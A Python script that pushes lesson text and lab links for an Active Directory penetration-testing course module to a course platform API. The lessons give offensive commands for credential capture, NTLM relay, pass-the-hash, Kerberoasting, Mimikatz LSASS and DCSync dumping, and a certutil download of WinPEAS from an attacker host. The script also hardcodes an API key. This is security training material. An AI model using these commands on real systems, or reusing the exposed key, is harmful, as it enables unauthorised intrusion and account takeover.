"""
Module E - CourseStack Push Script v2
Separate text lessons (from slides) + lab iframe lessons.
Matches the Module A v6 pattern exactly.

Run on Windows:
    python push_module_e_coursestack_v2.py

Or pull direct from GitHub:
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/heaps1345/mca-activites/main/scripts/push_module_e_coursestack_v2.py" -OutFile "push_module_e_coursestack_v2.py"
    python push_module_e_coursestack_v2.py
"""

import requests
from requests.auth import HTTPBasicAuth
import uuid
import time

API_KEY   = "sk_5e9fde21e45324530a735286f8e28bcecf3e9df298ab37ec016833ed57c4f2e52b215010e457e6f3de80c070d3161ff5"
BASE      = "https://app.coursestack.com"
COURSE_ID = "b9d920c3-4a8e-4227-af24-3c5f32fc7350"
auth      = HTTPBasicAuth(API_KEY, "")
HEADERS   = {"Content-Type": "application/json"}
GITHUB    = "https://heaps1345.github.io/mca-activites/cpsa/module-e"


def uid():
    return str(uuid.uuid4()).replace("-", "")


def api_post(path, payload):
    url = f"{BASE}{path}"
    r = requests.post(url, auth=auth, headers=HEADERS, json=payload, timeout=20)
    try:
        data = r.json()
    except Exception:
        data = {}
    if not r.ok:
        print(f"  ERROR {r.status_code}: {r.text[:300]}")
    return r.status_code, data


def create_chapter(name, description=""):
    print(f"\n[chapter] {name}")
    status, data = api_post(
        f"/api/content/{COURSE_ID}/chapters",
        {"name": name, "description": description}
    )
    chapter_id = None
    if isinstance(data, dict):
        chapter_id = (data.get("chapter") or data.get("data") or data).get("id") or data.get("id")
    print(f"  status={status}  chapter_id={chapter_id}")
    return chapter_id


def create_lesson(chapter_id, name, passing_percent=None):
    print(f"  [lesson] {name}")
    payload = {"name": name, "chapter_id": chapter_id, "type": "lesson"}
    if passing_percent is not None:
        payload["passing_percent"] = passing_percent
    status, data = api_post(f"/api/content/{COURSE_ID}/lessons", payload)
    lesson_obj = data.get("lesson") or data.get("data") or data
    if isinstance(lesson_obj, dict):
        lesson_id = lesson_obj.get("id")
    else:
        lesson_id = None
    if not lesson_id:
        lesson_id = data.get("id")
    print(f"    status={status}  lesson_id={lesson_id}")
    return lesson_id


def push_content(lesson_id, items):
    status, data = api_post(
        f"/api/content/{COURSE_ID}/lessons/{lesson_id}",
        {"content": {"type": "lesson", "id": uid(), "items": items}}
    )
    print(f"    push_content -> {status}")
    return status


def make_text(markdown):
    return {"id": uid(), "type": "text", "markdown": markdown}


def make_iframe(url):
    return {"id": uid(), "type": "iframe", "url": url, "aspect_height": 9, "aspect_width": 16}


# -------------------------------------------------------
# LESSON CONTENT - from Module E slides
# -------------------------------------------------------

E01_MD = """## What is Active Directory?

Active Directory is Microsoft's centralised identity and access management platform. It enforces trust across every Windows environment. Compromise AD and you compromise the organisation - not just one machine.

### Core Components

| Component | Role |
|-----------|------|
| **Domain** | A logical boundary of users, computers, and policies managed by a single authority |
| **Domain Controller** | The server hosting AD DS. It authenticates every logon and enforces every policy |
| **Forest** | A collection of domains sharing a common schema. The forest root trust is the highest value target |
| **Kerberos** | The default authentication protocol. Ticket-based. Central to most modern AD attacks |

> **Operator Takeaway:** Owning the Domain Controller means owning the keys to authentication for the entire organisation. This is why AD is always the primary objective.

### AD Attack Surface

AD exposes multiple protocols, each with its own attack surface. A skilled assessor targets all of them during enumeration.

| Protocol | Purpose | Attacker Objective |
|----------|---------|-------------------|
| LDAP | Directory queries | Enumerate accounts, SPNs, ACLs, descriptions |
| Kerberos | Ticket-based authentication | Kerberoasting, AS-REP Roasting, ticket forgery |
| SMB | File sharing and remote execution | Credential capture, relay attacks, lateral movement |
| RPC | Remote procedure calls | Enumeration via MS-SAMR, MS-LSAD |
| DNS | Name resolution | Domain Controller discovery, zone transfers |

### The Penetration Tester Mindset

Before you run a single tool, ask yourself these four questions. Every technique in this module is a means of answering them.

1. **Who controls authentication?** Identify Domain Controllers, trust anchors, and service accounts with elevated privileges.
2. **Where are the Domain Admins?** Logged on where? Member of which groups? Which sessions are active right now?
3. **Which protocols expose information?** LDAP, Kerberos, SMB, and DNS all leak data to an authenticated - or unauthenticated - attacker.
4. **Where can trust be abused?** Group membership, ACLs, and delegation settings all represent chains of trust that can be exploited.

> ★ **CREST CPSA:** Owning the Domain Controller is the objective of every Windows engagement. All enumeration and exploitation techniques exist to answer one question: how do I get there from here?
"""

E02_MD = """## Active Directory Enumeration

Your first objective on any Windows engagement is domain discovery. These are the commands that matter.

### Finding the Domain

```bash
# DNS - confirm the Domain Controller first
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN
nmap -p 53 --script dns-srv-enum --script-args dns-srv-enum.domain=DOMAIN

# Linux enumeration
enum4linux -a TARGET
enum4linux-ng -A TARGET

# Domain Controller discovery
nltest /dclist:DOMAIN
nmap -p 389,636,3268 TARGET
```

### High-Value Enumeration Targets

Not all enumeration is equal. Focus effort on objects that directly enable privilege escalation or lateral movement.

| Target | Why |
|--------|-----|
| **Domain Controllers** | The prize. Identify all DCs - primary and read-only. Every attack chain terminates here. |
| **Domain Admins** | Who is in DA? Where are they logged in? An active DA session on a workstation is a direct escalation path. |
| **SPNs** | Service Principal Names identify Kerberoastable accounts. One SPN on a privileged account = offline hash crack opportunity. |
| **ACLs and Trusts** | Misconfigured Access Control Lists grant write access across privilege boundaries. |
| **Active Sessions** | Where privileged users are logged in right now. Lateral movement to that machine captures their credentials in memory. |

### Enumeration Workflow

Follow this sequence on every engagement. Each step feeds the next.

1. Discover Domain
2. Find Domain Controller
3. Enumerate Users
4. Enumerate Groups
5. Enumerate Sessions
6. Enumerate ACLs

> ★ **CREST CPSA:** Always confirm the Domain Controller via DNS first. Everything else depends on it. Missing sessions or ACLs early means missing attack paths later.
"""

E03_MD = """## BloodHound

BloodHound uses graph theory to map Active Directory relationships and expose attack paths that are invisible to manual enumeration. It is the single most powerful AD assessment tool available to a penetration tester.

### How It Works

1. **Collect** - Run SharpHound.exe (Windows) or bloodhound-python (Linux) to gather AD data via LDAP and SMB
2. **Import** - Load the generated .zip into the BloodHound UI. Data is stored in a Neo4j graph database
3. **Visualise** - Query shortest paths, Kerberoastable users, ACL abuse routes, and active Domain Admin sessions

### Collection

```bash
# From Kali (preferred - no AV risk)
bloodhound-python -u USER -p PASSWORD -d DOMAIN -ns DC_IP -c All

# From target (Windows)
.\\SharpHound.exe -c All
```

### Five Attack Path Categories BloodHound Exposes

| Path Type | What It Means |
|-----------|--------------|
| **User Paths** | Direct group membership granting privileged access. The simplest path - often overlooked. |
| **ACL Abuse** | WriteDACL, GenericWrite, ForceChangePassword - permissions that allow privilege escalation without exploitation. |
| **Sessions** | Active privileged logons on reachable machines. Lateral movement to that host yields credential capture. |
| **Kerberoast** | Service accounts with SPNs. Request their ticket, crack offline, pivot to their privileges. |
| **Trusts** | Cross-domain and cross-forest trust relationships that extend the attack surface. |

### Key Queries - Run These on Every Engagement

- **Shortest Paths to Domain Admins** - always run this first
- **Find All Domain Admin Sessions** - shows where DA credentials are in memory right now
- **Kerberoastable Users** - high value accounts with weak passwords
- **Principals with DCSync Rights** - accounts that can dump all AD hashes

> ★ **CREST CPSA:** "Shortest Paths to Domain Admins" is always the first BloodHound query. HasSession edges are the most operationally valuable - they show where to find DA credentials already in memory.
"""

E04_MD = """## Windows Authentication Protocols

Understanding which protocol is in use tells you which attack applies. Know this table - CPSA examiners test it directly.

| Protocol | Status | Used For | Primary Attack |
|----------|--------|----------|---------------|
| **LM** | Disabled (legacy) | Pre-Windows 2000 | Trivially crackable - split into two 7-char halves |
| **NTLMv1** | Disabled by default | Older environments | Pass-the-Hash; offline crack |
| **NetNTLMv2** | Active - default | Network auth over SMB/HTTP | Capture with Responder; offline crack or relay |
| **Kerberos** | Active - preferred | Domain authentication | Kerberoasting; AS-REP Roasting; ticket forgery |

> **Critical:** NetNTLMv2 cannot be passed directly (unlike NT hashes) - it must be cracked or relayed.

### Pass-the-Hash

Pass-the-Hash exploits the way NTLM authentication works. The protocol uses the NT hash directly as a credential - knowledge of the plaintext password is never required.

**How it works:** NTLM authentication sends a challenge. The client responds using the NT hash. An attacker who holds the hash can respond identically - no cracking required.

**Why it matters:** A single compromised NT hash from Mimikatz or secretsdump grants access to every system where that account authenticates via NTLM. Lateral movement without knowing a single password.

```bash
crackmapexec smb TARGET -u admin -H NTHASH
impacket-psexec DOMAIN/admin@TARGET -hashes :NTHASH
```

> ★ **CREST CPSA:** Always attempt Pass-the-Hash before cracking. Cracking costs time. Passing costs nothing. NT hashes can be passed. NetNTLMv2 hashes cannot - they must be cracked (mode 5600) or relayed.
"""

E05_MD = """## Kerberos Attacks - Kerberoasting and AS-REP Roasting

Two distinct attacks exploit Kerberos to obtain offline-crackable hashes. Know the difference cold - this is a guaranteed CPSA exam area.

### Comparison

| Attribute | Kerberoasting | AS-REP Roasting |
|-----------|--------------|-----------------|
| Credentials required | Yes - valid domain account | **No - fully unauthenticated** |
| Target account type | Any account with an SPN | Accounts with preauth disabled |
| Hash type | TGS-REP (RC4/AES encrypted) | AS-REP (RC4 encrypted) |
| Hashcat mode | **13100** | **18200** |
| Impacket tool | GetUserSPNs.py | GetNPUsers.py |
| Mitigation | Strong passwords on service accounts | Enable Kerberos preauth on all accounts |

### Kerberoasting

Any authenticated domain user can request a Kerberos service ticket for any account with a registered SPN. The ticket is encrypted with the service account's NT hash - making it crackable entirely offline.

```bash
# Enumerate and request in one step
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt

# Crack with Hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting

Targets accounts with "Do not require Kerberos preauthentication." The KDC returns an AS-REP encrypted with the account password hash - without requiring any credentials from the attacker.

```bash
# No credentials needed
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -no-pass -format hashcat -outputfile asrep.txt

# Crack with Hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

> ★ **CREST CPSA:** AS-REP Roasting needs NO credentials - try it first when you have zero domain access. Memorise: Kerberoasting = mode 13100, AS-REP Roasting = mode 18200.
"""

E06_MD = """## Credential Capture - Responder and NTLM Relay

Responder poisons LLMNR and NBT-NS broadcast queries, intercepting authentication attempts and capturing NetNTLMv2 hashes - passively, with no scanning required.

### The Protocols

**LLMNR** - Link-Local Multicast Name Resolution. Fallback when DNS fails. Enabled by default.

**NBT-NS** - NetBIOS Name Service. Legacy broadcast fallback. Also enabled by default.

When a Windows host cannot resolve a name via DNS, it broadcasts an LLMNR/NBT-NS query to the local network. Responder answers: "That's me - authenticate to me." Windows authenticates, sending a NetNTLMv2 hash.

### Running Responder

```bash
responder -I eth0 -wPv

# Hashes captured in:
/usr/share/responder/logs/

# Crack with Hashcat
hashcat -m 5600 hash.txt rockyou.txt
```

### NTLM Relay Attack

If SMB signing is disabled on target servers, relay the captured credential directly - no cracking required.

**Attack chain:**
1. Disable SMB in Responder config. Run ntlmrelayx.py with target list.
2. Wait for any LLMNR/NBT-NS broadcast. Responder poisons. Victim authenticates to you.
3. ntlmrelayx forwards the credential to a target. If the user is local admin: command execution or secretsdump.

```bash
# Check for SMB signing first
nmap --script smb-security-mode -p 445 TARGET

# Relay (disable SMB in Responder.conf first)
ntlmrelayx.py -tf targets.txt -smb2support
```

> ★ **CREST CPSA:** Always check for SMB signing before deciding whether to crack or relay. Relay is faster and bypasses password complexity entirely. NetNTLMv2 = mode 5600 in Hashcat. Cannot be passed directly.
"""

E07_MD = """## Windows Privilege Escalation

Local privilege escalation is the bridge between a foothold and full domain compromise. These are the techniques and tools a CPSA candidate must know.

### Key Techniques

| Technique | How It Works |
|-----------|-------------|
| **WinPEAS** | Automated local enumeration. Identifies weak service permissions, unquoted paths, stored credentials, and registry misconfigurations in seconds. |
| **Unquoted Service Paths** | If a service binary path contains spaces and is unquoted, Windows resolves it in order - allowing a planted executable to run as SYSTEM. |
| **AlwaysInstallElevated** | If both HKCU and HKLM registry keys are set to 1, any user can install MSI packages as SYSTEM. |
| **DLL Hijacking** | A service loads a DLL from a directory the attacker controls. Replace the DLL - execution inherits service privileges. |
| **Mimikatz** | Post-elevation: dump LSASS for plaintext credentials, NT hashes, and Kerberos tickets. `sekurlsa::logonpasswords` |

### Workflow

1. **Enumerate first** - WinPEAS output is your roadmap. Read all of it before choosing a path.
2. **Low-hanging fruit** - AlwaysInstallElevated and unquoted paths are consistently present in enterprise environments.
3. **Post-SYSTEM** - Dump LSASS immediately. Extract every credential. Every hash is a lateral movement opportunity.

```powershell
# Transfer WinPEAS
certutil -urlcache -split -f http://KALI_IP/winpeas.exe winpeas.exe

# After SYSTEM - dump everything
sekurlsa::logonpasswords
lsadump::dcsync /domain:DOMAIN /all
```

> ★ **CREST CPSA:** AlwaysInstallElevated requires **both** HKCU and HKLM set to 1. If only one is set, the attack fails. Check both with `reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated` and the HKLM equivalent.
"""

E08_MD = """## Lateral Movement

Once credentials are in hand, lateral movement is about choosing the right protocol for the environment. Noise and detectability vary significantly.

### Techniques

| Technique | Purpose | Noise Level | Best Use Case |
|-----------|---------|-------------|---------------|
| **PsExec** | Remote command execution via SMB service creation | High - writes to disk, creates service | Quick access; low-detection-risk engagements |
| **WMI** | Remote process execution via WMI interface | Medium - fewer artefacts than PsExec | Stealthier execution; no service creation |
| **WinRM** | PowerShell remoting over HTTP/HTTPS | Low - built-in Windows feature | Interactive sessions; defence-in-depth environments |
| **RDP** | Full graphical desktop access | High - logged, visible, interactive | When GUI access is operationally required |

> WinRM with valid credentials is the most operationally clean lateral movement method in modern Windows environments.

### The Lateral Movement Mindset

Lateral movement is not random. Every pivot is purposeful - driven by credentials, sessions, and the goal of reaching Domain Admin.

1. **Access** - Foothold established. Local user or low-privilege domain account.
2. **Credentials** - Dump LSASS. Extract hashes, tickets, and plaintext. BloodHound maps where they work.
3. **Movement** - Pivot to machines where privileged users have active sessions. Repeat the credential cycle.
4. **Domain Admin** - Reach a machine with an active DA session. Dump LSASS. The domain is owned.

```bash
# WinRM (Evil-WinRM with NT hash)
evil-winrm -i TARGET -u admin -H NTHASH

# WMI execution
impacket-wmiexec DOMAIN/admin:password@TARGET

# PsExec
impacket-psexec DOMAIN/admin:password@TARGET
```

> ★ **CREST CPSA:** Every credential captured unlocks the next pivot. Every pivot yields more credentials. BloodHound shows you the route before you start moving.
"""

E09_MD = """## LDAP Enumeration

LDAP is the query interface to Active Directory. It is available to any authenticated domain user and exposes the entire directory. Most organisations never restrict what standard users can query.

### Key Queries

| Target | Query | Operator Value |
|--------|-------|---------------|
| All Users | `ldapsearch ... "(objectClass=user)"` | Full user list for spray / Kerberoast targeting |
| Domain Admins | `ldapsearch ... "(memberOf=CN=Domain Admins,...)"` | Priority targets for session hunting |
| SPNs | `ldapsearch ... "(servicePrincipalName=*)"` | Kerberoastable account identification |
| AS-REP accounts | `ldapsearch ... "(userAccountControl:...)"` | Accounts with preauth disabled |
| ACLs | `ldapsearch ... "(nTSecurityDescriptor=*)"` | Misconfigured permissions |

### What LDAP Tells the Attacker

| Data | Why It Matters |
|------|---------------|
| **Users and Groups** | Full account inventory including disabled and locked accounts. Builds the target list for every subsequent attack. |
| **Permissions and ACLs** | GenericWrite and WriteDACL on privileged objects are escalation paths that require no vulnerability. |
| **Descriptions and Notes** | Administrators frequently store passwords in the Description field. Query it on every engagement. |
| **SPNs and Preauth Flags** | Every Kerberoastable and AS-REP Roastable account in a single query. No special access required. |

### Practical Commands

```bash
# Full user enumeration with descriptions (password hunting)
ldapsearch -x -H ldap://DC_IP -D "user@DOMAIN" -w PASSWORD \\
  -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName description

# Find all SPNs (Kerberoastable accounts)
ldapsearch -x -H ldap://DC_IP -D "user@DOMAIN" -w PASSWORD \\
  -b "DC=domain,DC=com" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# GetUserSPNs is faster - but know the manual method
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP
```

> ★ **CREST CPSA:** Always check the Description field on every user account. Real-world assessments regularly find passwords stored there by administrators. This is consistently a HIGH finding.
"""

E10_MD = """## Module E - End-to-End Attack Chain

Every technique in this module is a link in the same chain. This is how a real engagement progresses from unauthenticated access to full domain compromise.

### The Full Chain

| Step | Technique | What It Gives You |
|------|-----------|------------------|
| 1 | SMB enumeration | Open shares, signing status, OS version |
| 2 | Responder (LLMNR/NBT-NS) | NetNTLMv2 hash capture |
| 3 | NTLM relay or Hashcat | Initial domain credentials |
| 4 | BloodHound / LDAP | Attack path map to Domain Admin |
| 5 | Kerberoasting / AS-REP | Additional credential material |
| 6 | WinPEAS + PrivEsc | SYSTEM on target machine |
| 7 | Mimikatz / secretsdump | All hashes from LSASS and AD |
| 8 | Pass-the-Hash / WinRM | Lateral movement to DA machine |
| 9 | DCSync | Full domain compromise |

### Key Facts to Memorise for CPSA

| Topic | Key Fact |
|-------|---------|
| NT hashes | Can be passed (PTH). Hashcat mode 1000. |
| NetNTLMv2 | Cannot be passed. Crack (mode 5600) or relay. |
| Kerberoasting | Needs domain user. Mode 13100. GetUserSPNs.py. |
| AS-REP Roasting | No credentials needed. Mode 18200. GetNPUsers.py. |
| DCC2 (cached creds) | Cannot be passed. Mode 2100. Slow to crack. |
| BloodHound | Run "Shortest Paths to Domain Admins" first. |
| Responder | LLMNR/NBT-NS poisoning. Check SMB signing before deciding relay vs crack. |

### No Exploit Required

This entire chain can be executed using only misconfigurations, protocol behaviour, and credential reuse. No CVE. No 0-day. Just trust relationships abused in sequence.

> ★ **CREST CPSA exam point:** The examiner will ask you to explain why each step feeds the next. Understand the chain, not just the individual tools.
"""

# -------------------------------------------------------
# MAIN
# -------------------------------------------------------

def main():
    print("=== Module E - CourseStack Push v2 ===")
    print(f"Course: {COURSE_ID}")
    print()

    # --- Chapter 1: Theory Lessons ---
    ch1 = create_chapter(
        "Module E - Windows Security Assessment",
        "Theory lessons covering Active Directory, authentication, enumeration, and exploitation techniques."
    )
    if not ch1:
        print("FATAL: could not create theory chapter")
        return

    theory_lessons = [
        ("E-01: What is Active Directory?",              E01_MD),
        ("E-02: Active Directory Enumeration",           E02_MD),
        ("E-03: BloodHound",                             E03_MD),
        ("E-04: Windows Authentication Protocols",       E04_MD),
        ("E-05: Kerberos Attacks",                       E05_MD),
        ("E-06: Credential Capture and NTLM Relay",      E06_MD),
        ("E-07: Windows Privilege Escalation",           E07_MD),
        ("E-08: Lateral Movement",                       E08_MD),
        ("E-09: LDAP Enumeration",                       E09_MD),
        ("E-10: End-to-End Attack Chain",                E10_MD),
    ]

    for name, md in theory_lessons:
        lid = create_lesson(ch1, name)
        if lid:
            push_content(lid, [make_text(md)])
        time.sleep(0.5)

    # --- Chapter 2: Labs ---
    ch2 = create_chapter(
        "Module E - Labs",
        "Hands-on lab exercises for the Windows Security Assessment attack chain."
    )
    if not ch2:
        print("FATAL: could not create labs chapter")
        return

    labs = [
        ("Module E Pre-flight: Engagement Brief and Environment Check", f"{GITHUB}/lab-e0-preflight-v1.html"),
        ("Lab E1-A: SMB Enumeration",                                   f"{GITHUB}/lab-e1a-smb-enumeration-v1.html"),
        ("Lab E2-A: Credential Access",                                  f"{GITHUB}/lab-e2a-credential-access-v1.html"),
        ("Lab E3-A: Windows Privilege Escalation",                       f"{GITHUB}/lab-e3a-windows-privesc-v1.html"),
        ("Lab E3-B: ACLs, Registry and File Permissions",                f"{GITHUB}/lab-e3b-acl-permissions-v1.html"),
        ("Lab E4-A: Active Directory Enumeration",                       f"{GITHUB}/lab-e4a-ad-enumeration-v1.html"),
        ("Lab E4-B: Password Policy and Password Spraying",              f"{GITHUB}/lab-e4b-password-policy-spray-v1.html"),
        ("Lab E5-A: Kerberos Attacks",                                   f"{GITHUB}/lab-e5a-kerberos-attacks-v1.html"),
        ("Lab E5-B: SAM Dump and Cached Domain Credentials",             f"{GITHUB}/lab-e5b-sam-dump-v1.html"),
        ("Lab E6-A: SQL Server Exploitation",                            f"{GITHUB}/lab-e6a-sql-exploitation-v1.html"),
        ("Lab E7-A: Patch Level Assessment and WSUS Review",             f"{GITHUB}/lab-e7a-patch-assessment-v1.html"),
    ]

    for name, url in labs:
        lid = create_lesson(ch2, name)
        if lid:
            push_content(lid, [make_iframe(url)])
        time.sleep(0.5)

    print()
    print("=== Done ===")


if __name__ == "__main__":
    main()
